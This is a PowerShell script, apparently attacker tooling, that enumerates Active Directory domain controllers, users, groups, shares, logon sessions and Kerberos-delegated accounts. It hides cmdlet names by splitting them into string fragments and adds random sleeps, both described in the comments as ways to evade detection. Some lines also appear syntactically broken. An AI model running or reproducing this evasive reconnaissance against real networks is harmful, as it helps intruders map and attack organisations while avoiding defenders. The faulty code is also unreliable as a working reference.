# Aliases for common cmdlets
$GetWmiObject = "GWMI"   # Alias for Get-WmiObject
$GetADUser = "G" + "e" + "t-" + "A" + "D" + "User"  # Obfuscation of Get-ADUser cmdlet
$GetADGroup = "G" + "e" + "t-" + "A" + "D" + "Group"  # Obfuscation of Get-ADGroup cmdlet

# Obfuscating Domain and Current User
$domain = ($($GetWmiObject -Class Win32_ComputerSystem)).Domain
$currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name

# Random Sleep to simulate legit activity
Start-Sleep -Seconds (Get-Random -Minimum 10 -Maximum 20)

# Enumerating Domain Controllers (obfuscated Get-ADDomainController)
Write-Host ("En" + "um" + "e" + "rating Domain Controllers...")
$gADC = G + 'e' + "t" + "-" + "A" + "D" + "D" + "omain" + "Controller"
& $gADC -Filter * | ForEach-Object {
    $_.HostName
}

# Random sleep to slow down execution
Start-Sleep -Seconds (Get-Random -Minimum 5 -Maximum 10)

# Enumerating all Users (obfuscated Get-ADUser)
Write-Host ("En" + "um" + "e" + "rating Users...")
& $GetADUser -Filter * -Property DisplayName, SamAccountName, Enabled | Select-Object DisplayName, SamAccountName, Enabled

# Sleeping to avoid overuse of system resources
Start-Sleep -Seconds (Get-Random -Minimum 5 -Maximum 10)

# Enumerating all Groups (obfuscated Get-ADGroup)
Write-Host ("En" + "um" + "e" + "rating Groups...")
& $GetADGroup -Filter * | Select-Object Name

# Obfuscating Trust Relationship Enumeration
Write-Host ("C" + "he" + "cking Trust Relationships...")
(Get-WmiObject -Class Win32_ComputerSystem).PartOfDomain

# Obfuscate Shares Enumeration
Write-Host ("En" + "um" + "e" + "rating network shares...")
$shares = & $GetWmiObject -Class Win32_Share | Select-Object Name, Path
$shares | ForEach-Object {
    Write-Host $_.Name, $_.Path
}

# Stealthy enumeration of current sessions (obfuscated Get-WmiObject)
Write-Host ("En" + "um" + "e" + "rating Active Sessions...")
$logonSessions = & $GetWmiObject -Class Win32_LogonSession
$logonSessions | ForEach-Object {
    Write-Host $_.LogonId, $_.StartTime
}

# Obfuscate Kerberos Delegation Enumeration
Write-Host ("C" + "he" + "cking Kerberos Delegation...")
$delegatedUsers = & $GetADUser -Filter {TrustedForDelegation -eq $true} -Property SamAccountName
$delegatedUsers | ForEach-Object {
    Write-Host $_.SamAccountName
}
